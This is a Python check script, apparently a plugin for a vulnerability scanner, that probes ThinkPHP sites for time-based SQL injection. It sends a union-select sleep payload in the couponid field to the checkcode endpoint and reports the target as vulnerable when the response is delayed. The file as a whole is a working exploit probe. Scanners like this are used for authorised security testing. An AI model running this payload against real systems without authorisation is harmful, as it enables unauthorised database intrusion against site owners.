#!/usr/bin/env python
#-*- coding:utf-8 -*-
import os
import requests
import time
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_sql_injection_post', 
        "Type": 'POST', 
        "Request": None
    }

    payload = '?s=/home/user/checkcode/'
    def make_data(sleep_time):
        data = {'couponid': f"1') union select sleep('''+str({sleep_time})+''')#"}
        return data 

    try:
        s = requests.session()
        s.keep_alive = False
        for i in range(1,2):
            data = make_data(1)
            s.post(url= url + payload, files=data)
            timea = time.time()

            data = make_data(5)
            r = s.post(url= url + payload, files=data)
            timeb = time.time()
            if timeb - timea > 4.5:
                items['Type'] = 'POST'
                items['Request'] = make_request_package(r.request)
                results.append(items.copy())
                break
        
        if len(results) == 0:
            return False
        return results

    except Exception as e:
        print(e)
        return False

if __name__ == '__main__':
    pass